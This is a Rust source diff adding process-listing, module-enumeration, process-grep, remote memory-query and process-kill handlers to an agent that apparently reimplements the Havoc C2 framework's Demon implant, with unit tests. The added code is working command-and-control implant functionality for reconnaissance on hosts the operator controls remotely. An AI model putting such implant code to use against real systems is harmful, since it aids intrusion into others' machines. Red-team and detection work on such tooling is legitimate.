@@ -74,6 +74,7 @@ pub fn dispatch(package: &DemonPackage, config: &mut SpecterConfig) -> DispatchR
         DemonCommand::CommandSleep => handle_sleep(&package.payload, config),
         DemonCommand::CommandFs => handle_fs(&package.payload),
         DemonCommand::CommandProc => handle_proc(&package.payload),
+        DemonCommand::CommandProcList => handle_proc_list(&package.payload),
         DemonCommand::CommandExit => DispatchResult::Exit,
         // These are agent-to-server callbacks; ignore if received from server.
         DemonCommand::CommandOutput | DemonCommand::BeaconOutput => DispatchResult::Ignore,
@@ -396,10 +397,10 @@ fn handle_proc(payload: &[u8]) -> DispatchResult {
 
     match subcmd {
         DemonProcessCommand::Create => handle_proc_create(subcmd_raw, &payload[offset..]),
-        _ => {
-            info!(subcommand = ?subcmd, "CommandProc: unhandled subcommand — ignoring");
-            DispatchResult::Ignore
-        }
+        DemonProcessCommand::Modules => handle_proc_modules(subcmd_raw, &payload[offset..]),
+        DemonProcessCommand::Grep => handle_proc_grep(subcmd_raw, &payload[offset..]),
+        DemonProcessCommand::Memory => handle_proc_memory(subcmd_raw, &payload[offset..]),
+        DemonProcessCommand::Kill => handle_proc_kill(subcmd_raw, &payload[offset..]),
     }
 }
 
@@ -578,6 +579,507 @@ fn translate_to_shell_cmd(path: &str, args: &str) -> String {
     if args.is_empty() { path.to_string() } else { format!("{path} {args}") }
 }
 
+// ─── Internal data types ─────────────────────────────────────────────────────
+
+/// One entry in a process list snapshot.
+struct ProcessInfo {
+    name: String,
+    pid: u32,
+    ppid: u32,
+    session_id: u32,
+    num_threads: u32,
+    is_wow64: bool,
+    user: String,
+}
+
+/// One loaded module (DLL / shared library) in a process.
+struct ModuleInfo {
+    /// Module file name (UTF-8 / ASCII).
+    name: String,
+    /// Base address of the loaded module image.
+    base_addr: u64,
+}
+
+/// One result entry from a process-name grep.
+struct GrepMatch {
+    name: String,
+    pid: u32,
+    ppid: u32,
+    user: String,
+    /// Architecture value sent on wire: 86 = x86 (WOW64), 64 = x64 native.
+    arch: u32,
+}
+
+/// One virtual-memory region from a process address-space query.
+struct MemRegion {
+    base_addr: u64,
+    /// Region size in bytes, truncated to u32 to match Demon's `PackageAddInt32`.
+    region_size: u32,
+    alloc_protect: u32,
+    state: u32,
+    mem_type: u32,
+}
+
+// ─── Platform-specific process/memory helpers ─────────────────────────────────
+
+// ── Windows ──────────────────────────────────────────────────────────────────
+
+#[cfg(windows)]
+#[allow(unsafe_code)]
+fn enum_processes() -> Vec<ProcessInfo> {
+    use std::mem;
+    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
+    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
+        CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW,
+        TH32CS_SNAPPROCESS,
+    };
+    use windows_sys::Win32::System::Threading::{
+        IsWow64Process, OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION,
+    };
+
+    let mut result = Vec::new();
+    // SAFETY: CreateToolhelp32Snapshot, Process32FirstW/NextW, and CloseHandle
+    // are safe to call with these arguments; PROCESSENTRY32W is zeroed before use.
+    unsafe {
+        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if snapshot == INVALID_HANDLE_VALUE {
+            return result;
+        }
+        let mut entry: PROCESSENTRY32W = mem::zeroed();
+        entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;
+        if Process32FirstW(snapshot, &mut entry) == 0 {
+            CloseHandle(snapshot);
+            return result;
+        }
+        loop {
+            let null_pos =
+                entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
+            let name = String::from_utf16_lossy(&entry.szExeFile[..null_pos]).to_string();
+
+            let hproc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, entry.th32ProcessID);
+            let mut is_wow: i32 = 0;
+            if hproc != 0 {
+                IsWow64Process(hproc, &mut is_wow);
+                CloseHandle(hproc);
+            }
+
+            result.push(ProcessInfo {
+                name,
+                pid: entry.th32ProcessID,
+                ppid: entry.th32ParentProcessID,
+                session_id: 0,
+                num_threads: entry.cntThreads,
+                is_wow64: is_wow != 0,
+                user: String::new(),
+            });
+
+            if Process32NextW(snapshot, &mut entry) == 0 {
+                break;
+            }
+        }
+        CloseHandle(snapshot);
+    }
+    result
+}
+
+#[cfg(windows)]
+#[allow(unsafe_code)]
+fn enum_modules(pid: u32) -> Vec<ModuleInfo> {
+    use std::mem;
+    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
+    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
+        CreateToolhelp32Snapshot, MODULEENTRY32W, Module32FirstW, Module32NextW, TH32CS_SNAPMODULE,
+    };
+
+    let mut result = Vec::new();
+    // SAFETY: CreateToolhelp32Snapshot, Module32FirstW/NextW, and CloseHandle
+    // are safe to call with these arguments; MODULEENTRY32W is zeroed before use.
+    unsafe {
+        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
+        if snapshot == INVALID_HANDLE_VALUE {
+            return result;
+        }
+        let mut entry: MODULEENTRY32W = mem::zeroed();
+        entry.dwSize = mem::size_of::<MODULEENTRY32W>() as u32;
+        if Module32FirstW(snapshot, &mut entry) == 0 {
+            CloseHandle(snapshot);
+            return result;
+        }
+        loop {
+            let null_pos =
+                entry.szModule.iter().position(|&c| c == 0).unwrap_or(entry.szModule.len());
+            let name = String::from_utf16_lossy(&entry.szModule[..null_pos]).to_string();
+            let base_addr = entry.modBaseAddr as u64;
+            result.push(ModuleInfo { name, base_addr });
+            if Module32NextW(snapshot, &mut entry) == 0 {
+                break;
+            }
+        }
+        CloseHandle(snapshot);
+    }
+    result
+}
+
+#[cfg(windows)]
+fn grep_processes(name_filter: &str) -> Vec<GrepMatch> {
+    let filter_lower = name_filter.to_lowercase();
+    enum_processes()
+        .into_iter()
+        .filter(|p| p.name.to_lowercase().contains(&filter_lower))
+        .map(|p| GrepMatch { name: p.name, pid: p.pid, ppid: p.ppid, user: p.user, arch: 64 })
+        .collect()
+}
+
+#[cfg(windows)]
+#[allow(unsafe_code)]
+fn query_memory(pid: u32, protect_filter: u32) -> Vec<MemRegion> {
+    use std::mem;
+    use windows_sys::Win32::Foundation::CloseHandle;
+    use windows_sys::Win32::System::Memory::{MEM_FREE, MEMORY_BASIC_INFORMATION, VirtualQueryEx};
+    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};
+
+    let mut result = Vec::new();
+    // SAFETY: OpenProcess, VirtualQueryEx, and CloseHandle are called with
+    // valid arguments; MEMORY_BASIC_INFORMATION is zeroed before use.
+    unsafe {
+        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
+        if hprocess == 0 {
+            return result;
+        }
+        let mut offset: usize = 0;
+        loop {
+            let mut mem_info: MEMORY_BASIC_INFORMATION = mem::zeroed();
+            let bytes = VirtualQueryEx(
+                hprocess,
+                offset as *const _,
+                &mut mem_info,
+                mem::size_of::<MEMORY_BASIC_INFORMATION>(),
+            );
+            if bytes == 0 {
+                break;
+            }
+            let next_addr = (mem_info.BaseAddress as usize).wrapping_add(mem_info.RegionSize);
+            offset = next_addr;
+
+            if mem_info.Type != MEM_FREE && mem_info.AllocationBase as usize != 0 {
+                let add = protect_filter == 0 || protect_filter == mem_info.AllocationProtect;
+                if add {
+                    #[allow(clippy::cast_possible_truncation)]
+                    result.push(MemRegion {
+                        base_addr: mem_info.BaseAddress as u64,
+                        region_size: mem_info.RegionSize as u32,
+                        alloc_protect: mem_info.AllocationProtect,
+                        state: mem_info.State,
+                        mem_type: mem_info.Type,
+                    });
+                }
+            }
+        }
+        CloseHandle(hprocess);
+    }
+    result
+}
+
+#[cfg(windows)]
+#[allow(unsafe_code)]
+fn kill_process(pid: u32) -> bool {
+    use windows_sys::Win32::Foundation::CloseHandle;
+    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_TERMINATE, TerminateProcess};
+
+    // SAFETY: OpenProcess, TerminateProcess, and CloseHandle are called with
+    // valid handle values; the handle is closed before return.
+    unsafe {
+        let hprocess = OpenProcess(PROCESS_TERMINATE, 0, pid);
+        if hprocess == 0 {
+            return false;
+        }
+        let success = TerminateProcess(hprocess, 0) != 0;
+        CloseHandle(hprocess);
+        success
+    }
+}
+
+// ── Linux / non-Windows ───────────────────────────────────────────────────────
+
+#[cfg(not(windows))]
+fn enum_processes() -> Vec<ProcessInfo> {
+    let Ok(entries) = std::fs::read_dir("/proc") else { return Vec::new() };
+    let mut result = Vec::new();
+    for entry in entries.flatten() {
+        let fname = entry.file_name();
+        let Ok(pid) = fname.to_string_lossy().parse::<u32>() else { continue };
+        let status = std::fs::read_to_string(format!("/proc/{pid}/status")).unwrap_or_default();
+        let mut name = String::new();
+        let mut ppid = 0u32;
+        let mut threads = 0u32;
+        for line in status.lines() {
+            if let Some(v) = line.strip_prefix("Name:\t") {
+                name = v.trim().to_string();
+            } else if let Some(v) = line.strip_prefix("PPid:\t") {
+                ppid = v.trim().parse().unwrap_or(0);
+            } else if let Some(v) = line.strip_prefix("Threads:\t") {
+                threads = v.trim().parse().unwrap_or(0);
+            }
+        }
+        if name.is_empty() {
+            continue;
+        }
+        result.push(ProcessInfo {
+            name,
+            pid,
+            ppid,
+            session_id: 0,
+            num_threads: threads,
+            is_wow64: false,
+            user: String::new(),
+        });
+    }
+    result
+}
+
+#[cfg(not(windows))]
+fn enum_modules(pid: u32) -> Vec<ModuleInfo> {
+    let maps_path =
+        if pid == 0 { String::from("/proc/self/maps") } else { format!("/proc/{pid}/maps") };
+    let Ok(content) = std::fs::read_to_string(&maps_path) else { return Vec::new() };
+    let mut seen = std::collections::HashSet::new();
+    let mut result = Vec::new();
+    for line in content.lines() {
+        let mut parts = line.splitn(6, ' ');
+        let addr_range = parts.next().unwrap_or("");
+        // skip perms, offset, dev, inode
+        let _ = parts.next();
+        let _ = parts.next();
+        let _ = parts.next();
+        let _ = parts.next();
+        let path = parts.next().map(str::trim).unwrap_or("").trim_start();
+        if path.is_empty() || (!path.ends_with(".so") && !path.contains(".so.")) {
+            continue;
+        }
+        if !seen.insert(path.to_string()) {
+            continue;
+        }
+        let base_addr =
+            addr_range.split('-').next().and_then(|s| u64::from_str_radix(s, 16).ok()).unwrap_or(0);
+        let name = std::path::Path::new(path)
+            .file_name()
+            .map(|n| n.to_string_lossy().into_owned())
+            .unwrap_or_else(|| path.to_string());
+        result.push(ModuleInfo { name, base_addr });
+    }
+    result
+}
+
+#[cfg(not(windows))]
+fn grep_processes(name_filter: &str) -> Vec<GrepMatch> {
+    let filter_lower = name_filter.to_lowercase();
+    enum_processes()
+        .into_iter()
+        .filter(|p| p.name.to_lowercase().contains(&filter_lower))
+        .map(|p| GrepMatch { name: p.name, pid: p.pid, ppid: p.ppid, user: p.user, arch: 64 })
+        .collect()
+}
+
+#[cfg(not(windows))]
+fn query_memory(pid: u32, protect_filter: u32) -> Vec<MemRegion> {
+    let maps_path =
+        if pid == 0 { String::from("/proc/self/maps") } else { format!("/proc/{pid}/maps") };
+    let Ok(content) = std::fs::read_to_string(&maps_path) else { return Vec::new() };
+    // Commit/private/mapped constants mirroring Windows MEM_* values for testing
+    const MEM_COMMIT: u32 = 0x1000;
+    const MEM_PRIVATE: u32 = 0x2_0000;
+    const MEM_MAPPED: u32 = 0x4_0000;
+    let mut result = Vec::new();
+    for line in content.lines() {
+        let mut parts = line.splitn(6, ' ');
+        let addr_range = parts.next().unwrap_or("");
+        let perms = parts.next().unwrap_or("");
+        let mut addr_iter = addr_range.split('-');
+        let start = addr_iter.next().and_then(|s| u64::from_str_radix(s, 16).ok()).unwrap_or(0);
+        let end = addr_iter.next().and_then(|s| u64::from_str_radix(s, 16).ok()).unwrap_or(0);
+        if end <= start {
+            continue;
+        }
+        let perms_bytes = perms.as_bytes();
+        let r = perms_bytes.first().copied() == Some(b'r');
+        let w = perms_bytes.get(1).copied() == Some(b'w');
+        let x = perms_bytes.get(2).copied() == Some(b'x');
+        let alloc_protect: u32 = match (r, w, x) {
+            (true, false, true) => 0x20,  // PAGE_EXECUTE_READ
+            (true, true, true) => 0x40,   // PAGE_EXECUTE_READWRITE
+            (true, true, false) => 0x04,  // PAGE_READWRITE
+            (true, false, false) => 0x02, // PAGE_READONLY
+            _ => 0x01,                    // PAGE_NOACCESS
+        };
+        if protect_filter != 0 && protect_filter != alloc_protect {
+            continue;
+        }
+        let is_shared = perms_bytes.get(3).copied() == Some(b's');
+        let mem_type = if is_shared { MEM_MAPPED } else { MEM_PRIVATE };
+        #[allow(clippy::cast_possible_truncation)]
+        let region_size = (end - start).min(u64::from(u32::MAX)) as u32;
+        result.push(MemRegion {
+            base_addr: start,
+            region_size,
+            alloc_protect,
+            state: MEM_COMMIT,
+            mem_type,
+        });
+    }
+    result
+}
+
+#[cfg(not(windows))]
+fn kill_process(pid: u32) -> bool {
+    SysCommand::new("kill")
+        .arg("-9")
+        .arg(pid.to_string())
+        .status()
+        .map(|s| s.success())
+        .unwrap_or(false)
+}
+
+// ─── COMMAND_PROC_LIST (12) ───────────────────────────────────────────────────
+
+/// Handle a `CommandProcList` task: enumerate all running processes and return
+/// the list in the wire format expected by the Havoc teamserver.
+///
+/// Incoming payload (LE): `[process_ui: u32]`
+///
+/// Outgoing payload (BE):
+/// `[process_ui: u32]` then per process:
+/// `[name: utf16le][pid: u32][is_wow64: u32][ppid: u32][session: u32][threads: u32][user: utf16le]`
+fn handle_proc_list(payload: &[u8]) -> DispatchResult {
+    let mut offset = 0;
+    let process_ui = parse_u32_le(payload, &mut offset).unwrap_or(0);
+    let processes = enum_processes();
+    let mut response = Vec::new();
+    write_u32_be(&mut response, process_ui);
+    for p in &processes {
+        write_utf16le_be(&mut response, &p.name);
+        write_u32_be(&mut response, p.pid);
+        write_u32_be(&mut response, u32::from(p.is_wow64));
+        write_u32_be(&mut response, p.ppid);
+        write_u32_be(&mut response, p.session_id);
+        write_u32_be(&mut response, p.num_threads);
+        write_utf16le_be(&mut response, &p.user);
+    }
+    DispatchResult::Respond(Response::new(DemonCommand::CommandProcList, response))
+}
+
+// ─── COMMAND_PROC / Modules (2) ──────────────────────────────────────────────
+
+/// Handle `CommandProc / Modules`: enumerate loaded modules in a process.
+///
+/// Incoming args (LE): `[pid: u32]` (0 = current process)
+///
+/// Outgoing payload (BE):
+/// `[subcmd: u32][pid: u32]` then per module: `[name: bytes][base_addr: u64]`
+fn handle_proc_modules(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
+    let mut offset = 0;
+    let pid = parse_u32_le(rest, &mut offset).unwrap_or(0);
+    let modules = enum_modules(pid);
+    let mut payload = Vec::new();
+    write_u32_be(&mut payload, subcmd_raw);
+    write_u32_be(&mut payload, pid);
+    for m in &modules {
+        write_bytes_be(&mut payload, m.name.as_bytes());
+        write_ptr_be(&mut payload, m.base_addr);
+    }
+    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
+}
+
+// ─── COMMAND_PROC / Grep (3) ─────────────────────────────────────────────────
+
+/// Handle `CommandProc / Grep`: find processes matching a name substring.
+///
+/// Incoming args (LE): `[name: bytes (UTF-16LE, length-prefixed)]`
+///
+/// Outgoing payload (BE):
+/// `[subcmd: u32]` then per match:
+/// `[name: utf16le][pid: u32][ppid: u32][user: utf16le][arch: u32]`
+fn handle_proc_grep(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
+    let mut offset = 0;
+    let name_bytes = match parse_bytes_le(rest, &mut offset) {
+        Ok(b) => b,
+        Err(e) => {
+            warn!("ProcGrep: failed to parse process name: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+    let name = decode_utf16le_null(&name_bytes);
+    let matches = grep_processes(&name);
+    let mut payload = Vec::new();
+    write_u32_be(&mut payload, subcmd_raw);
+    for m in &matches {
+        write_utf16le_be(&mut payload, &m.name);
+        write_u32_be(&mut payload, m.pid);
+        write_u32_be(&mut payload, m.ppid);
+        write_utf16le_be(&mut payload, &m.user);
+        write_u32_be(&mut payload, m.arch);
+    }
+    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
+}
+
+// ─── COMMAND_PROC / Memory (6) ───────────────────────────────────────────────
+
+/// Handle `CommandProc / Memory`: query virtual memory regions of a process.
+///
+/// Incoming args (LE): `[pid: u32][protection_filter: u32]`
+/// (protection_filter == 0 means return all regions)
+///
+/// Outgoing payload (BE):
+/// `[subcmd: u32][pid: u32][protection: u32]` then per region:
+/// `[base_addr: u64][region_size: u32][alloc_protect: u32][state: u32][type: u32]`
+fn handle_proc_memory(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
+    let mut offset = 0;
+    let pid = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("ProcMemory: failed to parse pid: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+    let protect_filter = parse_u32_le(rest, &mut offset).unwrap_or(0);
+    let regions = query_memory(pid, protect_filter);
+    let mut payload = Vec::new();
+    write_u32_be(&mut payload, subcmd_raw);
+    write_u32_be(&mut payload, pid);
+    write_u32_be(&mut payload, protect_filter);
+    for r in &regions {
+        write_ptr_be(&mut payload, r.base_addr);
+        write_u32_be(&mut payload, r.region_size);
+        write_u32_be(&mut payload, r.alloc_protect);
+        write_u32_be(&mut payload, r.state);
+        write_u32_be(&mut payload, r.mem_type);
+    }
+    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
+}
+
+// ─── COMMAND_PROC / Kill (7) ─────────────────────────────────────────────────
+
+/// Handle `CommandProc / Kill`: terminate a process by PID.
+///
+/// Incoming args (LE): `[pid: u32]`
+///
+/// Outgoing payload (BE): `[subcmd: u32][success: u32][pid: u32]`
+fn handle_proc_kill(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
+    let mut offset = 0;
+    let pid = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("ProcKill: failed to parse pid: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+    let success = kill_process(pid);
+    let mut payload = Vec::new();
+    write_u32_be(&mut payload, subcmd_raw);
+    write_u32_be(&mut payload, u32::from(success));
+    write_u32_be(&mut payload, pid);
+    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
+}
+
 // ─── Payload parsing helpers (server → agent, little-endian) ─────────────────
 
 /// Parse a `u32` in little-endian byte order from `buf[*offset..]`.
@@ -622,6 +1124,13 @@ fn write_bytes_be(buf: &mut Vec<u8>, data: &[u8]) {
     let len = data.len() as u32;
     buf.extend_from_slice(&len.to_be_bytes());
     buf.extend_from_slice(data);
+}
+
+/// Append a `u64` pointer in big-endian byte order (8 bytes).
+///
+/// Used for base-address fields; the Go teamserver's `ParsePointer` reads 8 bytes.
+fn write_ptr_be(buf: &mut Vec<u8>, v: u64) {
+    buf.extend_from_slice(&v.to_be_bytes());
 }
 
 /// Encode `s` as UTF-16LE with a NUL terminator and append `[u32 BE length][bytes…]`.
@@ -1112,5 +1621,264 @@ mod tests {
         let mut config = SpecterConfig::default();
         let package = DemonPackage::new(DemonCommand::CommandExit, 0, vec![]);
         assert!(matches!(dispatch(&package, &mut config), DispatchResult::Exit));
+    }
+
+    // ── write_ptr_be ─────────────────────────────────────────────────────────
+
+    #[test]
+    fn write_ptr_be_encodes_eight_bytes_big_endian() {
+        let mut buf = Vec::new();
+        write_ptr_be(&mut buf, 0x0011_2233_4455_6677);
+        assert_eq!(buf, [0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77]);
+    }
+
+    // ── handle_proc_list ─────────────────────────────────────────────────────
+
+    #[test]
+    fn handle_proc_list_uses_correct_command_id() {
+        let mut config = SpecterConfig::default();
+        // process_ui = 0 (console request)
+        let payload = 0u32.to_le_bytes().to_vec();
+        let package = DemonPackage::new(DemonCommand::CommandProcList, 1, payload);
+        let result = dispatch(&package, &mut config);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond, got {result:?}");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProcList));
+    }
+
+    #[test]
+    fn handle_proc_list_echoes_process_ui_flag() {
+        let mut config = SpecterConfig::default();
+        // process_ui = 1 (from process manager)
+        let payload = 1u32.to_le_bytes().to_vec();
+        let package = DemonPackage::new(DemonCommand::CommandProcList, 2, payload);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+            panic!("expected Respond");
+        };
+        let echoed_ui = u32::from_be_bytes(resp.payload[0..4].try_into().expect("be u32"));
+        assert_eq!(echoed_ui, 1, "process_ui must be echoed verbatim");
+    }
+
+    #[test]
+    fn handle_proc_list_contains_at_least_one_process() {
+        let mut config = SpecterConfig::default();
+        let payload = 0u32.to_le_bytes().to_vec();
+        let package = DemonPackage::new(DemonCommand::CommandProcList, 3, payload);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+            panic!("expected Respond");
+        };
+        // Payload must be > 4 bytes (the process_ui field) if any processes were enumerated.
+        assert!(resp.payload.len() > 4, "process list must contain at least one entry");
+    }
+
+    #[test]
+    fn handle_proc_list_includes_self_pid() {
+        let own_pid = std::process::id();
+        let mut config = SpecterConfig::default();
+        let payload = 0u32.to_le_bytes().to_vec();
+        let package = DemonPackage::new(DemonCommand::CommandProcList, 4, payload);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+            panic!("expected Respond");
+        };
+        // Parse the response: skip process_ui (4 bytes), then iterate entries.
+        let p = &resp.payload;
+        let mut pos = 4usize; // skip process_ui
+        let mut found = false;
+        while pos + 4 <= p.len() {
+            // name: length-prefixed utf16le
+            let name_len =
+                u32::from_be_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
+            pos += 4 + name_len;
+            if pos + 4 > p.len() {
+                break;
+            }
+            // pid
+            let pid = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("pid"));
+            pos += 4;
+            if pid == own_pid {
+                found = true;
+            }
+            // skip: is_wow64 + ppid + session_id + threads = 4 × u32 = 16 bytes
+            pos += 16;
+            // user: length-prefixed utf16le
+            if pos + 4 > p.len() {
+                break;
+            }
+            let user_len =
+                u32::from_be_bytes(p[pos..pos + 4].try_into().expect("user len")) as usize;
+            pos += 4 + user_len;
+        }
+        assert!(found, "own PID {own_pid} not found in process list");
+    }
+
+    // ── handle_proc_modules ──────────────────────────────────────────────────
+
+    #[test]
+    fn handle_proc_modules_returns_correct_command_id() {
+        let mut config = SpecterConfig::default();
+        // pid=0 → current process
+        let mut payload = 2u32.to_le_bytes().to_vec(); // subcmd = Modules
+        payload.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
+        let package = DemonPackage::new(DemonCommand::CommandProc, 10, payload);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
+        // First 4 bytes must be subcmd=2
+        let subcmd = u32::from_be_bytes(resp.payload[0..4].try_into().expect("subcmd"));
+        assert_eq!(subcmd, 2);
+    }
+
+    #[test]
+    fn handle_proc_modules_echoes_pid() {
+        let mut config = SpecterConfig::default();
+        let mut payload = 2u32.to_le_bytes().to_vec();
+        payload.extend_from_slice(&42u32.to_le_bytes()); // arbitrary pid
+        let package = DemonPackage::new(DemonCommand::CommandProc, 11, payload);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+            panic!("expected Respond");
+        };
+        let echoed_pid = u32::from_be_bytes(resp.payload[4..8].try_into().expect("pid"));
+        assert_eq!(echoed_pid, 42);
+    }
+
+    // ── handle_proc_grep ─────────────────────────────────────────────────────
+
+    #[test]
+    fn handle_proc_grep_correct_command_id_and_subcmd() {
+        let mut config = SpecterConfig::default();
+        let mut payload = 3u32.to_le_bytes().to_vec(); // subcmd = Grep
+        payload.extend_from_slice(&le_utf16le_payload("nonexistent_xzy_proc_name_123"));
+        let package = DemonPackage::new(DemonCommand::CommandProc, 20, payload);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
+        let subcmd = u32::from_be_bytes(resp.payload[0..4].try_into().expect("subcmd"));
+        assert_eq!(subcmd, 3, "subcmd must be echoed as 3 (Grep)");
+    }
+
+    #[test]
+    fn handle_proc_grep_empty_result_when_no_match() {
+        let mut config = SpecterConfig::default();
+        let mut payload = 3u32.to_le_bytes().to_vec();
+        payload.extend_from_slice(&le_utf16le_payload("zzz_no_such_process_zzz_99999"));
+        let package = DemonPackage::new(DemonCommand::CommandProc, 21, payload);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+            panic!("expected Respond");
+        };
+        // Only the subcmd field (4 bytes); no process entries.
+        assert_eq!(resp.payload.len(), 4, "no match → payload must be exactly subcmd u32");
+    }
+
+    #[test]
+    fn handle_proc_grep_missing_name_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        // Only the subcmd, no name bytes
+        let payload = 3u32.to_le_bytes().to_vec();
+        let package = DemonPackage::new(DemonCommand::CommandProc, 22, payload);
+        let result = dispatch(&package, &mut config);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    // ── handle_proc_memory ───────────────────────────────────────────────────
+
+    #[test]
+    fn handle_proc_memory_correct_command_id_and_subcmd() {
+        let mut config = SpecterConfig::default();
+        let mut payload = 6u32.to_le_bytes().to_vec(); // subcmd = Memory
+        payload.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
+        payload.extend_from_slice(&0u32.to_le_bytes()); // filter = all
+        let package = DemonPackage::new(DemonCommand::CommandProc, 30, payload);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
+        let subcmd = u32::from_be_bytes(resp.payload[0..4].try_into().expect("subcmd"));
+        assert_eq!(subcmd, 6, "subcmd must be echoed as 6 (Memory)");
+    }
+
+    #[test]
+    fn handle_proc_memory_echoes_pid_and_filter() {
+        let mut config = SpecterConfig::default();
+        let mut payload = 6u32.to_le_bytes().to_vec();
+        payload.extend_from_slice(&1234u32.to_le_bytes()); // pid
+        payload.extend_from_slice(&0x04u32.to_le_bytes()); // PAGE_READWRITE filter
+        let package = DemonPackage::new(DemonCommand::CommandProc, 31, payload);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+            panic!("expected Respond");
+        };
+        let echoed_pid = u32::from_be_bytes(resp.payload[4..8].try_into().expect("pid"));
+        let echoed_filter = u32::from_be_bytes(resp.payload[8..12].try_into().expect("filter"));
+        assert_eq!(echoed_pid, 1234);
+        assert_eq!(echoed_filter, 0x04);
+    }
+
+    #[test]
+    fn handle_proc_memory_self_returns_regions() {
+        let own_pid = std::process::id();
+        let mut config = SpecterConfig::default();
+        let mut payload = 6u32.to_le_bytes().to_vec();
+        payload.extend_from_slice(&own_pid.to_le_bytes()); // self
+        payload.extend_from_slice(&0u32.to_le_bytes()); // all regions
+        let package = DemonPackage::new(DemonCommand::CommandProc, 32, payload);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+            panic!("expected Respond");
+        };
+        // Header is 12 bytes (subcmd + pid + filter); must have at least one region (20 bytes).
+        assert!(
+            resp.payload.len() >= 12 + 20,
+            "self memory query must return at least one region; payload len={}",
+            resp.payload.len()
+        );
+    }
+
+    #[test]
+    fn handle_proc_memory_missing_pid_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let payload = 6u32.to_le_bytes().to_vec(); // subcmd only, no pid
+        let package = DemonPackage::new(DemonCommand::CommandProc, 33, payload);
+        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
+    }
+
+    // ── handle_proc_kill ─────────────────────────────────────────────────────
+
+    #[test]
+    fn handle_proc_kill_nonexistent_pid_returns_failure() {
+        let mut config = SpecterConfig::default();
+        let mut payload = 7u32.to_le_bytes().to_vec(); // subcmd = Kill
+        payload.extend_from_slice(&9_999_999u32.to_le_bytes()); // bogus pid
+        let package = DemonPackage::new(DemonCommand::CommandProc, 40, payload);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+            panic!("expected Respond");
+        };
+        let subcmd = u32::from_be_bytes(resp.payload[0..4].try_into().expect("subcmd"));
+        let success = u32::from_be_bytes(resp.payload[4..8].try_into().expect("success"));
+        let echoed_pid = u32::from_be_bytes(resp.payload[8..12].try_into().expect("pid"));
+        assert_eq!(subcmd, 7, "subcmd must be echoed as 7 (Kill)");
+        assert_eq!(success, 0, "kill of bogus pid must report failure");
+        assert_eq!(echoed_pid, 9_999_999);
+    }
+
+    #[test]
+    fn handle_proc_kill_missing_pid_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let payload = 7u32.to_le_bytes().to_vec(); // subcmd only, no pid
+        let package = DemonPackage::new(DemonCommand::CommandProc, 41, payload);
+        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn handle_proc_kill_payload_is_twelve_bytes() {
+        // The kill response is always exactly 12 bytes: subcmd(4) + success(4) + pid(4)
+        let mut config = SpecterConfig::default();
+        let mut payload = 7u32.to_le_bytes().to_vec();
+        payload.extend_from_slice(&1u32.to_le_bytes()); // pid=1 (init, will likely fail)
+        let package = DemonPackage::new(DemonCommand::CommandProc, 42, payload);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.payload.len(), 12, "kill response must be exactly 12 bytes");
     }
 }
